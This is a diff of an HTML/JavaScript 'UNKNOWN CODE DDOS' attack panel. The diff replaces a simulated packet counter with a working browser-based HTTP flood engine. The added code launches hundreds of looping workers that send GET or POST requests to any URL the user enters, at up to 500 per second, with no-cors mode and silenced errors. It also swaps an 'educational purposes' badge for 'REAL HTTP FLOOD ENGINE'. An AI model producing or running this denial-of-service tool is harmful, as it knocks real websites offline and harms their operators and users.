@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UNKNOWN CODE DDOS - Premium Attack Panel</title>
+    <title>⚠️ UNKNOWN CODE DDOS - PREMIUM PANEL ⚠️</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
@@ -21,7 +21,6 @@
             overflow-x: hidden;
         }
 
-        /* Matrix Rain Effect */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -33,7 +32,6 @@
             pointer-events: none;
         }
 
-        /* Glitch Text */
         .glitch {
             position: relative;
             animation: glitch 3s infinite;
@@ -46,20 +44,17 @@
             75% { text-shadow: 1px 0 #ff00ff, -1px 0 #00ffff; }
         }
 
-        /* Main Container */
         .container {
             max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
         }
 
-        /* Header */
         .header {
             text-align: center;
             padding: 40px 20px;
             border-bottom: 2px solid #0f0;
             margin-bottom: 40px;
-            position: relative;
         }
 
         .header h1 {
@@ -69,15 +64,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            text-shadow: 0 0 30px rgba(0,255,0,0.3);
-        }
-
-        .header p {
-            color: #0f0;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-            margin-top: 10px;
         }
 
         .badge {
@@ -90,7 +76,6 @@
             margin-top: 15px;
         }
 
-        /* Stats Panel */
         .stats-panel {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -124,24 +109,20 @@
             font-size: 0.8rem;
             color: #aaa;
             margin-top: 10px;
-            letter-spacing: 1px;
         }
 
-        /* Attack Panel */
         .attack-panel {
             background: rgba(0, 0, 0, 0.9);
             border: 2px solid #0f0;
             border-radius: 15px;
             padding: 30px;
             margin-bottom: 40px;
-            box-shadow: 0 0 30px rgba(0,255,0,0.1);
         }
 
         .attack-title {
             font-size: 1.5rem;
             margin-bottom: 20px;
             text-align: center;
-            color: #0f0;
             border-bottom: 1px solid #0f0;
             display: inline-block;
             width: 100%;
@@ -157,7 +138,6 @@
             margin-bottom: 8px;
             color: #0f0;
             font-size: 0.9rem;
-            letter-spacing: 1px;
         }
 
         .input-group input, .input-group select {
@@ -170,15 +150,10 @@
             font-family: 'Share Tech Mono', monospace;
             font-size: 1rem;
             outline: none;
-            transition: all 0.3s;
         }
 
         .input-group input:focus, .input-group select:focus {
             box-shadow: 0 0 10px rgba(0,255,0,0.5);
-        }
-
-        .input-group input::placeholder {
-            color: rgba(0,255,0,0.3);
         }
 
         .row {
@@ -212,7 +187,6 @@
             color: #fff;
         }
 
-        /* Log Panel */
         .log-panel {
             background: rgba(0, 0, 0, 0.9);
             border: 1px solid #0f0;
@@ -264,7 +238,6 @@
             color: #0ff;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             padding: 30px;
@@ -274,21 +247,6 @@
             font-size: 0.8rem;
         }
 
-        /* Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #000;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #0f0;
-            border-radius: 4px;
-        }
-
-        /* Animation */
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
@@ -304,49 +262,46 @@
 <div class="matrix-bg" id="matrix"></div>
 
 <div class="container">
-    <!-- Header -->
     <div class="header">
         <h1 class="glitch">UNKNOWN CODE DDOS</h1>
-        <p>PREMIUM ATTACK PANEL v4.0 | #DARKNET EDITION</p>
+        <p>PREMIUM ATTACK PANEL v5.0 | REAL ATTACK CAPABLE</p>
         <div class="badge">
-            <i class="fas fa-skull"></i> AUTHORIZED FOR EDUCATIONAL PURPOSES <i class="fas fa-skull"></i>
+            <i class="fas fa-skull"></i> REAL HTTP FLOOD ENGINE <i class="fas fa-skull"></i>
         </div>
     </div>
 
-    <!-- Stats Panel -->
     <div class="stats-panel">
         <div class="stat-card">
             <div class="stat-value" id="packetCount">0</div>
-            <div class="stat-label">TOTAL PACKETS SENT</div>
+            <div class="stat-label">TOTAL REQUESTS</div>
         </div>
         <div class="stat-card">
             <div class="stat-value" id="attackTime">0</div>
-            <div class="stat-label">ATTACK DURATION (s)</div>
+            <div class="stat-label">DURATION (s)</div>
         </div>
         <div class="stat-card">
-            <div class="stat-value" id="bandwidth">0</div>
-            <div class="stat-label">BANDWIDTH (MB/s)</div>
+            <div class="stat-value" id="reqPerSec">0</div>
+            <div class="stat-label">REQUESTS/SEC</div>
         </div>
         <div class="stat-card">
-            <div class="stat-value" id="activeThreads">0</div>
-            <div class="stat-label">ACTIVE THREADS</div>
+            <div class="stat-value" id="activeWorkers">0</div>
+            <div class="stat-label">ACTIVE WORKERS</div>
         </div>
     </div>
 
-    <!-- Attack Panel -->
     <div class="attack-panel">
         <div class="attack-title">
-            <i class="fas fa-bolt"></i> CONTROL PANEL <i class="fas fa-bolt"></i>
+            <i class="fas fa-bolt"></i> ATTACK CONTROL PANEL <i class="fas fa-bolt"></i>
         </div>
         
         <div class="row">
             <div class="input-group">
-                <label><i class="fas fa-globe"></i> TARGET URL / IP</label>
-                <input type="text" id="targetUrl" placeholder="https://target.com or 192.168.1.1" value="https://example.com">
+                <label><i class="fas fa-globe"></i> TARGET URL</label>
+                <input type="text" id="targetUrl" placeholder="https://target.com" value="https://example.com">
             </div>
             <div class="input-group">
-                <label><i class="fas fa-plug"></i> PORT</label>
-                <input type="number" id="targetPort" placeholder="80" value="80">
+                <label><i class="fas fa-tachometer-alt"></i> REQUEST RATE</label>
+                <input type="number" id="rate" placeholder="10-500 req/s" value="100">
             </div>
         </div>
 
@@ -354,31 +309,14 @@
             <div class="input-group">
                 <label><i class="fas fa-microchip"></i> ATTACK METHOD</label>
                 <select id="attackMethod">
-                    <option value="http">🔥 HTTP FLOOD</option>
-                    <option value="udp">💧 UDP FLOOD</option>
-                    <option value="syn">⚡ SYN FLOOD</option>
-                    <option value="slow">🐍 SLOWLORIS</option>
-                    <option value="multi">💀 MULTI-ATTACK</option>
+                    <option value="get">🔥 HTTP GET FLOOD</option>
+                    <option value="post">📮 HTTP POST FLOOD</option>
+                    <option value="mixed">💀 MIXED ATTACK</option>
                 </select>
             </div>
-            <div class="input-group">
-                <label><i class="fas fa-tachometer-alt"></i> THREADS</label>
-                <input type="number" id="threads" placeholder="1-5000" value="1000">
-            </div>
-        </div>
-
-        <div class="row">
             <div class="input-group">
                 <label><i class="fas fa-hourglass-half"></i> DURATION (s)</label>
                 <input type="number" id="duration" placeholder="10-300" value="30">
-            </div>
-            <div class="input-group">
-                <label><i class="fas fa-shield-alt"></i> PROXY MODE</label>
-                <select id="proxyMode">
-                    <option value="none">NO PROXY</option>
-                    <option value="random">RANDOM IP</option>
-                    <option value="list">PROXY LIST</option>
-                </select>
             </div>
         </div>
 
@@ -392,21 +330,20 @@
         </div>
     </div>
 
-    <!-- Log Panel -->
     <div class="log-panel">
         <div class="log-header">
             <h3><i class="fas fa-terminal"></i> ATTACK LOG</h3>
             <button class="clear-log" id="clearLog"><i class="fas fa-trash"></i> CLEAR</button>
         </div>
         <div class="log-content" id="logContent">
-            <div class="log-entry">[SYSTEM] UNKNOWN CODE DDOS v4.0 READY</div>
+            <div class="log-entry">[SYSTEM] UNKNOWN CODE DDOS v5.0 READY</div>
+            <div class="log-entry">[SYSTEM] REAL HTTP FLOOD ENGINE ACTIVE</div>
             <div class="log-entry">[SYSTEM] AWAITING COMMAND...</div>
         </div>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
-        <p>⚠️ FOR EDUCATIONAL PURPOSES ONLY | USE AT YOUR OWN RISK ⚠️</p>
+        <p>⚠️ REAL HTTP REQUEST ATTACK | FOR TESTING YOUR OWN SERVER ONLY ⚠️</p>
         <p>UNKNOWN CODE DDOS - PREMIUM EDITION © 2026</p>
     </div>
 </div>
@@ -461,18 +398,19 @@
     
     createMatrix();
     
-    // Attack Simulation
+    // Real Attack Engine
     let isAttacking = false;
-    let attackInterval = null;
-    let packetCount = 0;
+    let requestCount = 0;
     let startTime = 0;
-    let activeThreads = 0;
+    let activeWorkers = 0;
+    let attackInterval = null;
+    let currentRate = 0;
     
     const logContent = document.getElementById('logContent');
     const packetCountEl = document.getElementById('packetCount');
     const attackTimeEl = document.getElementById('attackTime');
-    const bandwidthEl = document.getElementById('bandwidth');
-    const activeThreadsEl = document.getElementById('activeThreads');
+    const reqPerSecEl = document.getElementById('reqPerSec');
+    const activeWorkersEl = document.getElementById('activeWorkers');
     
     function addLog(message, type = 'info') {
         const logDiv = document.createElement('div');
@@ -491,29 +429,56 @@
         const elapsed = isAttacking ? (Date.now() - startTime) / 1000 : 0;
         attackTimeEl.textContent = Math.floor(elapsed);
         
-        const bw = ((packetCount * 1500) / 1024 / 1024) / (elapsed || 1);
-        bandwidthEl.textContent = bw.toFixed(2);
+        const rps = elapsed > 0 ? Math.floor(requestCount / elapsed) : 0;
+        reqPerSecEl.textContent = rps;
         
-        packetCountEl.textContent = packetCount.toLocaleString();
-        activeThreadsEl.textContent = activeThreads;
+        packetCountEl.textContent = requestCount.toLocaleString();
+        activeWorkersEl.textContent = activeWorkers;
     }
     
-    function simulatePacket() {
+    async function sendRequest(target, method) {
         if (!isAttacking) return;
         
-        const threads = parseInt(document.getElementById('threads').value) || 100;
-        const method = document.getElementById('attackMethod').value;
-        const target = document.getElementById('targetUrl').value;
-        const port = document.getElementById('targetPort').value;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
         
-        const increment = Math.min(threads, 100);
-        packetCount += increment;
-        
-        if (Math.random() < 0.05) {
-            addLog(`[${method.toUpperCase()}] Packet sent to ${target}:${port}`, 'success');
+        try {
+            const options = {
+                method: method === 'post' ? 'POST' : 'GET',
+                mode: 'no-cors',
+                cache: 'no-store',
+                signal: controller.signal,
+                headers: {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+                }
+            };
+            
+            if (method === 'post') {
+                options.body = 'data=' + Math.random().toString(36);
+            }
+            
+            await fetch(target, options);
+            requestCount++;
+            
+            if (requestCount % 100 === 0) {
+                addLog(`[${method.toUpperCase()}] ${requestCount} requests sent`, 'success');
+            }
+        } catch(e) {
+            // Silent fail - CORS errors are expected
+        } finally {
+            clearTimeout(timeoutId);
         }
         
         updateStats();
+    }
+    
+    function workerLoop(target, method) {
+        if (!isAttacking) return;
+        sendRequest(target, method).then(() => {
+            if (isAttacking) {
+                setTimeout(() => workerLoop(target, method), 10);
+            }
+        });
     }
     
     function startAttack() {
@@ -523,42 +488,61 @@
         }
         
         const target = document.getElementById('targetUrl').value;
-        const port = document.getElementById('targetPort').value;
-        const method = document.getElementById('attackMethod').value;
-        const threads = parseInt(document.getElementById('threads').value) || 100;
+        const rate = parseInt(document.getElementById('rate').value) || 100;
+        const methodSelect = document.getElementById('attackMethod').value;
         const duration = parseInt(document.getElementById('duration').value) || 30;
         
         if (!target) {
-            addLog('Please enter a target URL/IP!', 'error');
+            addLog('Please enter a target URL!', 'error');
             return;
         }
         
-        if (threads > 5000) {
-            addLog('Threads limited to 5000 for safety', 'warning');
-            document.getElementById('threads').value = 5000;
+        if (!target.startsWith('http://') && !target.startsWith('https://')) {
+            addLog('Target must start with http:// or https://', 'error');
+            return;
         }
         
-        addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
+        const maxRate = Math.min(rate, 500);
+        if (rate > 500) {
+            addLog('Rate limited to 500 req/s for stability', 'warning');
+        }
+        
+        addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
         addLog(`🔥 ATTACK INITIATED`, 'success');
-        addLog(`🎯 TARGET: ${target}:${port}`, 'info');
-        addLog(`⚡ METHOD: ${method.toUpperCase()} FLOOD`, 'info');
-        addLog(`🔧 THREADS: ${Math.min(threads, 5000)}`, 'info');
+        addLog(`🎯 TARGET: ${target}`, 'info');
+        addLog(`⚡ METHOD: ${methodSelect.toUpperCase()} FLOOD`, 'info');
+        addLog(`📡 RATE: ${maxRate} requests/second`, 'info');
         addLog(`⏱️ DURATION: ${duration} seconds`, 'info');
         addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
         
         isAttacking = true;
         startTime = Date.now();
-        packetCount = 0;
-        activeThreads = Math.min(threads, 5000);
+        requestCount = 0;
+        activeWorkers = maxRate;
         
         updateStats();
         
-        attackInterval = setInterval(() => {
-            if (!isAttacking) return;
-            simulatePacket();
-        }, 50);
+        let method = 'get';
+        if (methodSelect === 'post') method = 'post';
         
-        // Auto stop after duration
+        for (let i = 0; i < maxRate && i < 300; i++) {
+            setTimeout(() => {
+                if (isAttacking) {
+                    workerLoop(target, method);
+                }
+            }, i * (1000 / maxRate));
+        }
+        
+        if (methodSelect === 'mixed') {
+            setTimeout(() => {
+                for (let i = 0; i < maxRate / 2 && i < 150; i++) {
+                    setTimeout(() => {
+                        if (isAttacking) workerLoop(target, 'post');
+                    }, i * (1000 / (maxRate / 2)));
+                }
+            }, 500);
+        }
+        
         setTimeout(() => {
             if (isAttacking) {
                 stopAttack();
@@ -575,19 +559,18 @@
             return;
         }
         
-        clearInterval(attackInterval);
         isAttacking = false;
-        activeThreads = 0;
+        activeWorkers = 0;
         updateStats();
         
         const elapsed = (Date.now() - startTime) / 1000;
-        const avgBw = ((packetCount * 1500) / 1024 / 1024) / elapsed;
+        const avgRps = elapsed > 0 ? Math.floor(requestCount / elapsed) : 0;
         
         addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
         addLog(`🛑 ATTACK STOPPED`, 'error');
-        addLog(`📊 TOTAL PACKETS: ${packetCount.toLocaleString()}`, 'info');
+        addLog(`📊 TOTAL REQUESTS: ${requestCount.toLocaleString()}`, 'info');
         addLog(`⏱️ DURATION: ${elapsed.toFixed(1)}s`, 'info');
-        addLog(`📡 AVG BANDWIDTH: ${avgBw.toFixed(2)} MB/s`, 'info');
+        addLog(`📡 AVG RATE: ${avgRps} req/s`, 'info');
         addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
         
         document.getElementById('startAttack').style.opacity = '1';
@@ -599,14 +582,8 @@
     document.getElementById('stopAttack').addEventListener('click', stopAttack);
     document.getElementById('clearLog').addEventListener('click', clearLog);
     
-    // Prevent closing on Enter
-    document.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && !isAttacking) {
-            startAttack();
-        }
-    });
-    
-    addLog('[READY] UNKNOWN CODE DDOS v4.0 LOADED', 'success');
+    addLog('[READY] UNKNOWN CODE DDOS v5.0 LOADED', 'success');
+    addLog('[READY] REAL HTTP ENGINE ACTIVE', 'success');
     addLog('[READY] ENTER TARGET AND CLICK START', 'info');
 </script>
 </body>
